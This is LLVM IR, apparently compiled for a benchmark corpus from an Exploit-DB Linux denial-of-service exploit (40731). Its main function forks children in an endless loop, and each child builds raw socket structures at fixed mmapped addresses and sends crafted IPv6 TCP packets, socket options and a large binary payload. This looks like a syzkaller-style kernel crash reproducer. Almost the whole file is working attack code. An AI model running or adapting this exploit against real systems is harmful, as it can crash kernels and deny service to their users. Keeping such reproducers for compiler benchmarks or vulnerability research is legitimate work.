; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_40731.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_40731.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@SYS_mmap = common dso_local global i32 0, align 4
@r = common dso_local global i32* null, align 8
@SYS_socket = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [129 x i8] c"\0A\00\AB\12\C7\17\1C\83\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\01\05O\DC\C0\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00", align 1
@SYS_bind = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [166 x i8] c"%\F9\1B\D4\EB\F59<\D5\80\F6\F0\D6\E1\FFe0\97\AC\AF\1B\BC\C8\AE\A4\1E\AB\D8`Q\CBK\ED\AE\AA7\DA\80\F9\06\B8k\DFx\0F\D0\87\F2e_^\85\B5MkH\FF\F3\0DF\1C\E5\A4H8x\18q\9Bu\C4\C9w\F2\C4_\88\8E\D2\8D\97&VL\931\BCd\22\FF\DCh\01tC\EA\84o\1D\90\EB\98l\E9\1C;r\AB\A0\B5[\E8\EE\FB\F3-\96\A0\D4\13U\BC\D4\E0A\FDx~\90\F9\9F\9CW2G\F2\CF\7FJ{y\0A\DD\B4\CE\BD\0BD\02\95\0F\AFP\FF\87\90\09\AA\94\01AC\08\8E\B1\00", align 1
@.str.2 = private unnamed_addr constant [29 x i8] c"\0A\00\AB\12\0D\F5\BAi\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\01\AC\AD\CE\A0\00", align 1
@SYS_sendto = common dso_local global i32 0, align 4
@SYS_setsockopt = common dso_local global i32 0, align 4
@SYS_dup = common dso_local global i32 0, align 4
@SYS_sendmsg = common dso_local global i32 0, align 4
@SYS_recvfrom = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [4097 x i8] c"\ED\E0\F1\03\BD\1D\E2\8D\13b\C9\11\DE;U\B1\B2&\95\B2?2\96\8A=\F7\D4,\D92\AE\05\9A`\09\BCIcjE\D5o\A8K\AF\8Af\F35\AD\E6h\85\D4~\E5|~\06\BF2\FB\F9\D2\9F@\A3\0A\A0\93\09s9}\AC<\8D\83\E0\0C^\A26\9B\9C\B4b\E89\07\D8q\C1/o\18\FA\8A]\06\B4F\A2\97y\81\B2\85\D4OkH\C4\F5\DD\A8\8D\10t\01\E1X\B2\82r\C4\B6\B2\F7\AA\90\9C\9Fa\95\87{\99\C5\A5S\BC\AB\DB\DB^2\B8\C3\EE\D3\DAz\F2\\\C5\1A\F1\D6\1BS\AD$\D0\A0\C0\0Ds\9E\81~N\82\F5\A9s<z\\nLH}B\F5/h\F9~\A9\D8jdx\08z7\E9\D3\81\154cc\14\B7\1AC\9BO\85\FA\88\\\E1\1E\CE\87\95\E1\81\C8\06\AF\1Ad&6\836\EFq\0C*\DA\E4\FF\A1\87\C2\04\96\1Cr\D9-\F0\CEF\D4:\D1\C7/`%\F83\1F8zF\B1C\A4\D2ewG\85\E9\ADR\DB\8B\93#\F1\F9\A9_\E4\F89\82\C5\B4\E1[\87\A0\FD,\C2\84\15x\AA\9B?\E5un\05\EF\84Lk\9D\1D\9E|\92;U\CB\01o\C5\9A\D8\C3\919\95\D7\8F\E9\87\15'\E7\19\A8\18$\FD\09\11IA\C6\D2\E9\1A\F4\B0\9B\85\9B?\B1\F3\C3H\C5\E7E\0B!-2'\92<9R\0F+\DFRfo\01\8F\DC\FA\8F^S\B7\82#y\FA(\E5$\A7^*$~\D0\1E\D5\1A\B6\B8\E5\B2mM8ay\B8\D1'\92c\0C\ED<\F1\13\987\FA\98\DA\0C\1A\86\D1j\12\86/\D0\8D\8E.R#\AC-\82Y\EF\17\BC\F1G\FB\F0_Cp\99\14\DF\AFD\02\B5\E99Q\8E\F2\07\9C\A29\AB\07\A2\22\A7\D3\\\C0\8C\CF<\A2\A7\D0\D6\F4\82\CC5u: \B7\9B\F3\9D\D9\FE\DF\1E?U\F2\99\DB\D0\B2\D7\86\C1\FA\B3\C7\99\DC\02\E3\9F\FD\1EV\C1\F2Q2\84a03\F6\E3\82\9F\F2\04\AF]\F4=\A6\0E%S\E9\05|B\BF\FA\97\D7w\8C\8F)z\CB@\13\07\B5\8Di\DC\8B5\D3\B6\F3\D8\07\94~i\0F\B7(\F1\B3E`7e\A4\F6\BF\9C\B3\F9=\E1\08\08\C9v^\8B\7F&\01\9D\8F\159\02\FE\8A\E3;\8B\F9\AE\06\04\EF\0D\CFg$T\E6L\E4\05\8E\D7\DAL\F2\D7\88u\87\F7~\D0I\19\02^\00\C4\EB>\ECp5\9C\9B\C9\D9GeL\A3\DB\0E\DE\1EvX'\E0\91k\F9%D\A6\A2\85\8FP\D0\13\88W%Vx\ED\CBk\EC\F2O\D4\CE\F1\90\CDIP\B5\CF\D3\96M<\F4T\8E\A9\DB\D3\B5\9E\E9\87\19\8BY\D7\F2\CF\1A\D3p\CAB\C6\97f8$9MB\A1\F0$F\E4\0E\9C\BC\C4S\A9\B9\94M\CAH\A6\04\B8/O\F5\852\22\F8N\83\AB4';\8F$H\15\9B\A9\F8\B9\B7\CB\D5\FBr\ECz\C39\9C\DE%v\08?I5\BDBO?^\FCkk\9E>4Gb\EDZ\AE\DC\CFN\E6\18\FA\7F\E6F\C8\BE\BCB\88\B6\FE\BD\96\85ZJ\1D\D2\00\E9qHHR\D6\F5\88}\94\18\F6\F0\\\0A9)\C8x\A0\A8D\F4\B6\CAxuJ\F7S\D7~#\AFk\F9\CDw\B2\D07)\9CW\BE\9E_|\E4AY\DE\D5c\02*\C0t\A6\00\E2\8F\830\C1`\CD\B3\CAD\1D\88T\8B\BC\A8yx\86\A2I|\94I\F3\B4ADv3\F1.q\BC\A19\B9hV\D9\A0\A1o\DC}\A3\B8O\1C\B8\19&B\88\0E\CB\BB\C9l\A8\F8\E97\86a7\9F\BA\B3\9ET\07\E6\FFoT\8C\CF~=\14\FD\94\BB\DCY]\22\86\B5;\18\0D\08\AD\15gk\F1\C8\D8\81\AC\14c\CF\1E\F9H\BA\E03L\1Er\E9\00\1AH\C5\B4,q\D6z\0B\8Fl\02\9A\02\A9 \BD\8AV\E1Y\92\1F_\EAa\1B\E3/\C0\15\9C>\CF\E7\05\BC~\E8\88Xc)\C5\10&\F0\BC\F5\CD=3\FA\87E%\1D\86\C0\D8r\DC\1B\AF\A1\F3\1E\81\B4{M\B5yr\87\92\1F\9D\A1\8E\1A$\7FI\11\C4Y\A5\8Elz\DD\17RG;\09(\E4;\EF\B0\F3h\9C\D3n\E9\898\DB\EB\01O9\9B[\0C\8D\92\CD\\\15G\15\A9\98pu\E2\F0[\FE\AA\A9\B3\BA\C9\8E\\m\FBS\B9\8BO~1\BEi~m\80o>\D8Y\1C\13Z;+\0E\C6\D1\F9\AA\F10\16\F1{/k_\A9\DE\FA\FDY\AA\DD2\F7\BB\94(\93\16\B3`\D5lb\93\BA\A9\AA8R\DC/7u\1DV\A9<|\8B\0DV\9E\05\F7\A1\A6\EF<vn\06\06\DE\07\84\A0\EB\EB\8EF/\D9\C2V\C6\89\85\8C9\AD\A2w$\E5\B5\00\04L\F5\1EJ\03\06\BB\A1\1F\E7\F8\B7>\DD\FC\18\BF\13\07\14\DD\8Ak\0FD\C0\EBJC}B\E9\02c\B5\C2z\87\CE\14\0C\AF\D9+\AFK\22\EC\A9;\16\EB\B7\C5\0DQ\91\93]\90\E1\8F4\86q\E0|\B5\1E\E7\19\C0\D6\C9>\08u\C0\1F\AB^A\BF\0E\1A\14\CC@\F6\85\02\BA=x\CE\F7o\0E\BFQ\DA\C6\A1Y\BDi\1A\05{4\BD\A7(9\A1\A2\18\A7v\8FQ\A5\D2\DC\F4\A7{\C8d\0E\C0\E8\AC\C3\D4\B9\11xXy\E4\91\C9\CF\E2\0C\BB\11\B3\80H\D7\A5\BDE\DD\B6\AD\87y\01\A0\E1\89\DBTB\1CxG\91\07\E8\BC&\15\F2\DB\BA[\AAZ\05\84\A2\83}\E5\BBZw?\0A'\06N\86i\95'\22~\A2BMa\A7\ABm\05\8B{k\94\D6\10@f0\0Bly\E1b\EE3\ED\D6\D4\9A:\EA\95[`pX\C9\C6lG\A7\D1\CC\FA\9F\C7f\AC\BBO\E4\09t\E3\D1\EB\82;\CEL+\CF\08\CD\F6\96+e*,3\F5{f\DB\EC=\BF$\F7\F9\87\99&\1BZ\A0\D0\0E/\C0.\03\CD\F4\1E\10|\B5\B7\ECu, \89\C4\ECa4;lh\14\95\D9\9A\03\D7\F2k\E6P\14\80r\A2g\AF\B3\19\12\CC\F9\9D=4\86H\E7\A6\E7\C0\9Bl\EB,\0D&o\09\D9\8C\92\8E\DE\80\04\14\E6\88\BB9/,\14\F2\DA\86\DB\10YT\83\E6^\E3\14Ks\97\9A\94\A8\09D\1D\D0b-C\B4^8\AA\8E[\DD/\D3,\8E\D3\D0\0F\9D\80\CA\87N\ABR\01)\B7\E7U\A2\E4-\EE\CE0\E9\CB\C4>\F9X\04c\01\EC\893\01&}\E2]A\F7\91\A3\CBAb\B4\82m\B9\D1\AD\F2\96\0F\AD\87\BEm\95\AF\C2\14\12x\10\90\86aU\97w\\\19\FEN\DA\F3t\08\83M\A0%\04\05K\F30\C1/\B6\16-\9B,}\90Z\D2(S\C5:\14\8C\1F\DA\D76G\DC\85\7F+\E8\0D\F9\03\92\BA\82 \DE\B3e\14\E8\DD\FEk:\AB\D5\AD\03\CBOA\08\97\22\E7\C7\1D\0E|\8EM\12,\86\8B\B31C_n7\CF\08\83M\16\D7?J\80+g\1A\BB\AF\8D\1C\1C]\003\F3g\13C\F1\09\00\81h\E13\B1\B4\C1\AD\D9\99\0C\ACO\09&\D7\FF\C8\CD\FD\E92R\D1L\EEa\89\E0\82d\A3k\EB#\87\C8\ED\94\A6kh\EC\13Y\A7t\06}\ACo\FD\F5=;\9D\8B\E1\22\98\F3\0E\BD?\FA\BE\B9\86=\E4\1F0\D4\96o\7F\D4H\BC\C9\8B\1E\8Fc\A1\B4\A9C\F2\B8(^W\93\C5V!\12 \D5\16)\14\B0\FFB\BA\0E&n\CD~|r'\FB\D2\0F\AC\DB\0D\C8\C8\D6\A0\C7[\FD\0C\D7\89\E8\8B\EE$\0F\D1x#\82\E7\B5\7Fc\B3\14\10x&#\D3`\BDSZ\1Bg\0F\CF\D5\FE\90\18\A9\D6\80\C3\94\00!m\DB\AB\098\0Dw\DC>\90/<\0E\06k\AF\14E\CC\0D\CB\1Bt\DC\01\EC)#\96\E0*\86\EE\92\9C\86\10\9F=zV\F3o;\EF+\84\D5\CF\D3\F7+\A6\0D\9C\A2\B0B\8F\EDS\99z\11d^S\92\B7\97 \AA%\C2]k\BD\DEX\E7Q\C2\D5\A5\E0\9B\BF\E4\81\1C\D5\C4\EE)\FA\D2\BB\CE\BF\FE@\EE\09\F5K\B2\1E3\EF\8F\F9\05h\15zE\A0R<)\F4\01\F2d\98-\BD\89\AE\86\80\D9\0A\FE\CA\86F\C3X\D6\1DT\D4o6\E02j#)\BDi\22\9B\1E\7F\01(\FF\C0\1C\8F\01\08\A4\96\DA\FE\96\AB\F2#44\B0F8\D6/\87b\CF\96\85\BB\CC\98'\FC\91\EA\D9x\C4\CBB\C0\D3}\90\1C\FAb\A8\B7\F31\04V\A1\97\E1\A8\FC\AB\90d\01\81\AE \05/\91\AF'\B9\B5\12\CE\94\A6k2\F2\D0\0B\F5q\FF\BB\D8\E1 _\0D\BE\90D\E4\A5\B5\F6\A3p[\D3$\A2\B6\BA\22\D7'G\FF\FFye\F1\82\CFQV\A6oH2f{??|\B8o\0F-\E8\92r\86\C4\9Eo\E7\B6?\B6o\96\DCh\8D\1D\1C\FE?#E}5\ED=j\06\E8K\7F\B1\E6+fJSE\A4\\w\96%J\13:\F3\BE~\16\B0Q\84S\E6N7\D7\C1\EE\DA\FB\18\B0\81;\16\FC\EA2\00u\97\1A\C9\F9ZD\1A\12\08\CB\BE`y\80`\CD\BD[`\9B\FC1[\CA\A5\DA\16\18E\95\E1[\D4L\DC\C9\10s\14\BB\0B\9C\DB\0C\0C\8C;B)\F4}\93aZjk\AC\AE\80`]\D1>\E4m\F7?\B8{\7F5\1Bg\D3`\80\0A\08%\FF\BB1G`\B3\D1\0E\CE\BC\F3\88\E0V^a\97c\82\A4\FF\EA\F9H\7FLbXF0\E5,\BE\A0\18\E4\E8\F6O\22[\1D\18\B0H\0C\E7%\A9\1A\8EZ?\BDL\AB\E7R)\A25w\F5\0C\8CN-\A9\16\11\00\DF\8B\E1\7F\8F \9D\E9\EA+N\F4\E5\98N\F8\E9[\98\B9*\B8h\0D\DB5\F8\FD](\14*e3=\DEw\C5s\EE\C4\A4\8Ev\12O(\93}\D8\F5\BF29\E1\C1\AAFq\9F\CB\A4\93\A5\AE\E0\B1\9F\03\B3\BE\86\F9\92Eed\8D\D9I\09\D2\0C\01\92u\1A)C4t!m\A6\0E\A7;\15,Y\C2\B9\8A\92\CB\C3\8C\C7\06\FD\FC\E1g\C7\C5\C6\07$\C8\06\A7\DCv\83C\EC\90;o\A0\00\9AhDq\19\BE\DB$\B0\CB\9B\8A(\B60\99y\D2B\BES2\84\0C\17\DC\C9\1C\A9\ED& i\EFm\C4\A4\AD\E5h\ECR\E8Q?\B2R\BCo\84&A\F9\91\22f\89\CC\03\A6\A5z\07\D75\92^\C1\F9\11\1BKmP{OC\CA\137\D2m\CE\81\A8\9B\8B\8Ceu\08\97\18\B6\D2.\D2\E31Q.\B0\B3\04dq\BA\05K#\91\92\FDJ\1Bl5\A5\8F\CB\B5\AC\D9@\E5Kk\04\E2*\AB\D9\0D\CF\0B#\FA\1F\CDJF\B0&\C4\B8\AE\17\82l\7Fo\E6\1A\8C\0D\95\DF\E2\C2\D4\\\85my;\8AlQ\F3_\06\DF\07[i\8A\DEuYmp\99U\09\8F\F8\C0o.\C3\0F\87\1Cy\E8K\B0UQ\B2\A3\91\9B\B0\89\17\AD\9B\89\81#\12\CBE\8A\D7*\0A\19\84}\B9d\A61\A3H0<\01k|t \E6\0B\FF*\0Af\82\001\01\BC\F8G\02\CCC\BEm\0C\0EOY7M\CB\C27\EE^\1C,\F3\DA\C8\F8\C9\8C\BC\FF\D9\8B\8A\EEN\AB\19\8F\B6\B4\E7\0A\DA\9C\\\00\C3&\87c\B0\A9\1B1b\EF\04\10hl<\D1\BAs\C1\AA\F2\E4\BD)\DB,\E3i\F04\8D\D3knYBo(=/\83'H\C0\B7\82\D3\95\96\0C\DF\22\C7\CEw\AB\09L\AD\AB\0Dp\EEM\EA\B3cb\04o\D7h.\86|\AC\D4\C2n\09\DF\F0\BE\8Cq\D9\A8\82\F8\D2\14p\B7\D0@\12^\A7\EC\AB\1A\13\87\0Bn(Yv\01\B2?db5\B3\FF\0D\8A=kZ\D3\9EY\14m\19L\99\04u\E4\04\E3\F2\8A\19w\06\DD_.%,\A3\B5R\A6\FA+\845\DCVU\02cy\81;'\82A\92\19\B3\E3c\CE\B5\0C\1A\15\158*R\F0\DDX=\A4\7F[\B9\A3\9C\90\14\F9,+\AA\1E\0D\FD\F6\93~\BC\C3Y\11n\D9R\1E\D0\EA\0BU\0Bq\FAi\DA\9D5\10p2h\E8\DEGt\1F\C6`\86\BD\15\1CkR\EB\E4\04\0F\8Cp/\8Dm~_\FD\E7\D1\87\80v\D8z,\BF\B2\98\12\83\81\94\11}\1C\90\FD\F0\DC\E6\9D\EEv\DEP\CB\97%\CA\88\D8p\97@%\94\C5\FE\8BD\05\8Dn\7F\AB\C3'\D8\0EJ0\B5\FB\95\F84u\01\1F\E6\AC\81\1B\13c\B7`\B8\1C;\DA\07&\9E\FD\EB\7FCF\93uc\DC\A7\E9\C1\8F\A9\06\96\E7\10\87\B42J0i\D2\F4+]v\A3\94kr\D9\C6\FAjI\12\C7\C2t?\C49\9F\A0~\CD\81\9CT\0F\14\CE\D3~\D8\E8\D2\C2$.\C5\1BX\F8\8E\E6\AA\16ilK@\86\1A\1A\AD\11o\90Hh\93\B1\8F\BD\AF\8D\00\09^\F4\E3\03Y\FF\8F\F5\F0\E2\A1y\93\F5v\CBV\93\B8\E6\22\E5i\90=\0F\9BW\86\19\F7c\D5,\FE\ADc`\9E\9E)\04\E9M\B6\D9\B1\DBB-\8B\8Dm\DD\AE\0B\CAX8\F40\AD\AE\A3=dG\E0w\C3\ED\C8\E0}<l\DA\BDG^7\B4\E4\B8\1Ci\16\B6\D5\8B\9A\15\FAk!\88t\BB\DF\E3\BE1\02\8E\82\81\10\98$t\04\AD\E3\C5cW\0DX\BE\1C\97\A1\0D\B6U\83\18A7\A7\1BQ7\13\99\EBo\E3p\C2J\8C\17\C60\8D\01\FE\D4qL\EE\82\94\E4\1D\9A\8A\EDHa\BAlc_;\13\9F[\E4\0B,D\1C\B7\F6\C7d\F6tJ\16z5\F7.\9DO\008\A7\AD\E7\17\0C\B7?\02A\E9\A37[\98\D5\0F\C6\E6\D18N\87O/\02\A1'M\B2\03\FCPH\AA3\92\E1\10\A6\0B\B0 |W\D4\85UQn~\DF\A2F\F5\94\93\03\02\DB\94U#\D9[\99+:~}\B1\80G\F9w\EE\0F^c\7F\1E\96\DF\F9\1C\81U\DD\02\81\87\C8\04RYI\D4\08\D5sC?\D2\F9\A9\F0\D7\B9\97\86\9C\0A\C6}Z\98\88+\0B8\A1\CB\F8q\C7]\FE\BA\D0&K\DF\B8\11\8Fq`h\C7\82\D06\97#V\DARX\90\0AB\0B\FC\F8\C9\1F6\7F\9F\E5[\F8n\E1xG\FEk\00\CD\E5k\E2\A6\AF+3\95syR\13\1C\87=\8D\BC2\1E\11%\91Q\A0\AF\CC\F1\C3Z\EA\8B\15\82v\A9\0F\E7\08sS\02L\8C\B2\8DK\A0\ED7 \7FT\A2*3k_:OTa\85\91\86hZ\D4\80\C9!\A9\16]w\EE(\EB\C2\\\22\E4'\DB[\E4\A7p\DCj\8E\D9\E7w\09[\94\97\C6\F4\1Fz5\9E&\1E\8B7\E3\A4\DC\0A\8A\19Y:w\81-\9B\0EQ+\D7\C5\BC\07\FA\F3)y5\98\E3\B8\F7\E5@\DF\A8\93\00\F6S\8C\CC3\DF\0E5>r\8DH\85\05@C\E1\13\D6J\95P\F82\CA\C3\1C(\D4A\15d\C1\08\FB,\C2\1Fy0X\AA|\0D\83\8E\87\F4.\A3\FC\EB\D0\DB\CC\15\CD\88\99Au\13\C1\0CS\96\FE\FF\EB\87j\04u\F2\98@~\C7NGc1/\B2\A2\880\CAI\FBW@e\8C\C9\80 \B9\C9\FCy\12\8D\E6$$_8G<\93dA\9A\F2\E8\AB\C1\AF\13\95\\&N\02\99_j\E3\D4\91\0A\F5\06:-\C9\22\96k\A0w\00w|&\DC\B6\C1\1Bl\C8\FEC,\E2\DCX~08\98\97\DF\DA\AE\9D@\94\B7\16\91f\94l*P9i\CE\B4\\\EC.`q\92\A3\14\1F\08p\CB\9CG[\F3\F4\EAz4C2\8B\19W\D2\E7\1C\C5\EB\A5f7s\80Y\AC\1E\C0/\F10\F4\D0\C7x+8\D3\ABt\FDM\DF^\C5\A7\89\1B\B7v\F5\F9\FD\CA\FC\C2\0D\00", align 1
@SYS_write = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [17 x i8] c"collected child\0A\00", align 1
@.str.5 = private unnamed_addr constant [13 x i8] c"fork failed\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i64, align 8
  %7 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  br label %8

8:                                                ; preds = %2, %107
  %9 = call i64 (...) @fork()
  store i64 %9, i64* %6, align 8
  %10 = load i64, i64* %6, align 8
  %11 = icmp eq i64 %10, 0
  br i1 %11, label %12, label %96

12:                                               ; preds = %8
  %13 = load i32, i32* @SYS_mmap, align 4
  %14 = call i32 @syscall(i32 %13, i32 536870912, i32 131072, i32 3, i32 50, i32 -1, i32 0)
  %15 = load i32*, i32** @r, align 8
  %16 = getelementptr inbounds i32, i32* %15, i64 0
  store i32 %14, i32* %16, align 4
  %17 = load i32, i32* @SYS_socket, align 4
  %18 = call i32 @syscall(i32 %17, i32 10, i32 1, i32 0, i32 0, i32 0, i32 0)
  %19 = load i32*, i32** @r, align 8
  %20 = getelementptr inbounds i32, i32* %19, i64 1
  store i32 %18, i32* %20, align 4
  %21 = call i32 @memcpy(i8* inttoptr (i64 536895488 to i8*), i8* getelementptr inbounds ([129 x i8], [129 x i8]* @.str, i64 0, i64 0), i32 128)
  %22 = load i32, i32* @SYS_bind, align 4
  %23 = load i32*, i32** @r, align 8
  %24 = getelementptr inbounds i32, i32* %23, i64 1
  %25 = load i32, i32* %24, align 4
  %26 = call i32 @syscall(i32 %22, i32 %25, i32 536895488, i32 128, i32 0, i32 0, i32 0)
  %27 = load i32*, i32** @r, align 8
  %28 = getelementptr inbounds i32, i32* %27, i64 3
  store i32 %26, i32* %28, align 4
  %29 = load i32, i32* @SYS_mmap, align 4
  %30 = call i32 @syscall(i32 %29, i32 537001984, i32 4096, i32 3, i32 50, i32 -1, i32 0)
  %31 = load i32*, i32** @r, align 8
  %32 = getelementptr inbounds i32, i32* %31, i64 4
  store i32 %30, i32* %32, align 4
  %33 = call i32 @memcpy(i8* inttoptr (i64 536948570 to i8*), i8* getelementptr inbounds ([166 x i8], [166 x i8]* @.str.1, i64 0, i64 0), i32 165)
  %34 = call i32 @memcpy(i8* inttoptr (i64 537001984 to i8*), i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.2, i64 0, i64 0), i32 28)
  %35 = load i32, i32* @SYS_sendto, align 4
  %36 = load i32*, i32** @r, align 8
  %37 = getelementptr inbounds i32, i32* %36, i64 1
  %38 = load i32, i32* %37, align 4
  %39 = call i32 @syscall(i32 %35, i32 %38, i32 536948570, i32 165, i32 -32203380, i32 537001984, i32 28)
  %40 = load i32*, i32** @r, align 8
  %41 = getelementptr inbounds i32, i32* %40, i64 7
  store i32 %39, i32* %41, align 4
  store i64 2, i64* inttoptr (i64 536879103 to i64*), align 8
  %42 = load i32, i32* @SYS_setsockopt, align 4
  %43 = load i32*, i32** @r, align 8
  %44 = getelementptr inbounds i32, i32* %43, i64 1
  %45 = load i32, i32* %44, align 4
  %46 = call i32 @syscall(i32 %42, i32 %45, i32 1, i32 8, i32 536879103, i32 4, i32 0)
  %47 = load i32*, i32** @r, align 8
  %48 = getelementptr inbounds i32, i32* %47, i64 9
  store i32 %46, i32* %48, align 4
  %49 = load i32, i32* @SYS_dup, align 4
  %50 = load i32*, i32** @r, align 8
  %51 = getelementptr inbounds i32, i32* %50, i64 1
  %52 = load i32, i32* %51, align 4
  %53 = call i32 @syscall(i32 %49, i32 %52, i32 0, i32 0, i32 0, i32 0, i32 0)
  %54 = load i32*, i32** @r, align 8
  %55 = getelementptr inbounds i32, i32* %54, i64 10
  store i32 %53, i32* %55, align 4
  store i64 4, i64* inttoptr (i64 536969216 to i64*), align 8
  %56 = load i32, i32* @SYS_setsockopt, align 4
  %57 = load i32*, i32** @r, align 8
  %58 = getelementptr inbounds i32, i32* %57, i64 1
  %59 = load i32, i32* %58, align 4
  %60 = call i32 @syscall(i32 %56, i32 %59, i32 41, i32 11, i32 536969216, i32 4, i32 0)
  %61 = load i32*, i32** @r, align 8
  %62 = getelementptr inbounds i32, i32* %61, i64 12
  store i32 %60, i32* %62, align 4
  store i64 536928256, i64* inttoptr (i64 536928200 to i64*), align 8
  store i64 12, i64* inttoptr (i64 536928208 to i64*), align 8
  store i64 536870912, i64* inttoptr (i64 536928216 to i64*), align 8
  store i64 1, i64* inttoptr (i64 536928224 to i64*), align 8
  store i64 0, i64* inttoptr (i64 536928232 to i64*), align 8
  store i64 0, i64* inttoptr (i64 536928240 to i64*), align 8
  store i64 4, i64* inttoptr (i64 536928248 to i64*), align 8
  store i64 0, i64* inttoptr (i64 536928256 to i64*), align 8
  store i64 0, i64* inttoptr (i64 536928258 to i64*), align 8
  store i64 65535, i64* inttoptr (i64 536928260 to i64*), align 8
  store i64 1025, i64* inttoptr (i64 536928264 to i64*), align 8
  store i64 536931642, i64* inttoptr (i64 536870912 to i64*), align 8
  store i64 55, i64* inttoptr (i64 536870920 to i64*), align 8
  store i64 20, i64* inttoptr (i64 536931642 to i64*), align 8
  store i64 2, i64* inttoptr (i64 536931646 to i64*), align 8
  store i64 18, i64* inttoptr (i64 536931648 to i64*), align 8
  store i64 31, i64* inttoptr (i64 536931650 to i64*), align 8
  store i64 7, i64* inttoptr (i64 536931654 to i64*), align 8
  store i64 6, i64* inttoptr (i64 536931658 to i64*), align 8
  store i64 256, i64* inttoptr (i64 536931659 to i64*), align 8
  store i64 63, i64* inttoptr (i64 536931660 to i64*), align 8
  store i64 17, i64* inttoptr (i64 536931661 to i64*), align 8
  store i64 0, i64* inttoptr (i64 536931665 to i64*), align 8
  store i64 2056, i64* inttoptr (i64 536931667 to i64*), align 8
  store i64 1, i64* inttoptr (i64 536931669 to i64*), align 8
  store i64 0, i64* inttoptr (i64 536931673 to i64*), align 8
  store i64 0, i64* inttoptr (i64 536931677 to i64*), align 8
  store i64 18, i64* inttoptr (i64 536931678 to i64*), align 8
  store i64 746, i64* inttoptr (i64 536931682 to i64*), align 8
  store i64 512, i64* inttoptr (i64 536931684 to i64*), align 8
  store i64 5, i64* inttoptr (i64 536931686 to i64*), align 8
  store i64 -1, i64* inttoptr (i64 536931690 to i64*), align 8
  store i64 9, i64* inttoptr (i64 536931694 to i64*), align 8
  store i64 1, i64* inttoptr (i64 536931695 to i64*), align 8
  %63 = load i32, i32* @SYS_sendmsg, align 4
  %64 = load i32*, i32** @r, align 8
  %65 = getelementptr inbounds i32, i32* %64, i64 10
  %66 = load i32, i32* %65, align 4
  %67 = call i32 @syscall(i32 %63, i32 %66, i32 536928200, i32 2049, i32 0, i32 0, i32 0)
  %68 = load i32*, i32** @r, align 8
  %69 = getelementptr inbounds i32, i32* %68, i64 47
  store i32 %67, i32* %69, align 4
  store i64 1, i64* inttoptr (i64 536875011 to i64*), align 8
  store i64 0, i64* inttoptr (i64 536875013 to i64*), align 8
  store i64 9, i64* inttoptr (i64 536875015 to i64*), align 8
  %70 = load i32, i32* @SYS_recvfrom, align 4
  %71 = load i32*, i32** @r, align 8
  %72 = getelementptr inbounds i32, i32* %71, i64 10
  %73 = load i32, i32* %72, align 4
  %74 = call i32 @syscall(i32 %70, i32 %73, i32 536955537, i32 222, i32 0, i32 536875003, i32 8)
  %75 = load i32*, i32** @r, align 8
  %76 = getelementptr inbounds i32, i32* %75, i64 51
  store i32 %74, i32* %76, align 4
  %77 = call i32 @memcpy(i8* inttoptr (i64 536957573 to i8*), i8* getelementptr inbounds ([4097 x i8], [4097 x i8]* @.str.3, i64 0, i64 0), i32 4096)
  %78 = load i32, i32* @SYS_sendto, align 4
  %79 = load i32*, i32** @r, align 8
  %80 = getelementptr inbounds i32, i32* %79, i64 10
  %81 = load i32, i32* %80, align 4
  %82 = call i32 @syscall(i32 %78, i32 %81, i32 536957573, i32 4096, i32 49280, i32 0, i32 0)
  %83 = load i32*, i32** @r, align 8
  %84 = getelementptr inbounds i32, i32* %83, i64 53
  store i32 %82, i32* %84, align 4
  %85 = load i32, i32* @SYS_mmap, align 4
  %86 = call i32 @syscall(i32 %85, i32 537010176, i32 4096, i32 3, i32 50, i32 -1, i32 0)
  %87 = load i32*, i32** @r, align 8
  %88 = getelementptr inbounds i32, i32* %87, i64 54
  store i32 %86, i32* %88, align 4
  store i64 40, i64* inttoptr (i64 537014237 to i64*), align 8
  store i64 1024, i64* inttoptr (i64 537014241 to i64*), align 8
  store i64 0, i64* inttoptr (i64 537014245 to i64*), align 8
  store i64 2219, i64* inttoptr (i64 537014253 to i64*), align 8
  store i64 -5, i64* inttoptr (i64 537014261 to i64*), align 8
  store i64 5, i64* inttoptr (i64 537014269 to i64*), align 8
  %89 = load i32, i32* @SYS_write, align 4
  %90 = load i32*, i32** @r, align 8
  %91 = getelementptr inbounds i32, i32* %90, i64 10
  %92 = load i32, i32* %91, align 4
  %93 = call i32 @syscall(i32 %89, i32 %92, i32 537014237, i32 40, i32 0, i32 0, i32 0)
  %94 = load i32*, i32** @r, align 8
  %95 = getelementptr inbounds i32, i32* %94, i64 61
  store i32 %93, i32* %95, align 4
  br label %107

96:                                               ; preds = %8
  %97 = load i64, i64* %6, align 8
  %98 = icmp sgt i64 %97, 0
  br i1 %98, label %99, label %103

99:                                               ; preds = %96
  %100 = load i64, i64* %6, align 8
  %101 = call i32 @waitpid(i64 %100, i32* %7, i32 0)
  %102 = call i32 @printf(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.4, i64 0, i64 0))
  br label %106

103:                                              ; preds = %96
  %104 = call i32 @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.5, i64 0, i64 0))
  %105 = call i32 @exit(i32 1) #3
  unreachable

106:                                              ; preds = %99
  br label %107

107:                                              ; preds = %106, %12
  br label %8
}

declare dso_local i64 @fork(...) #1

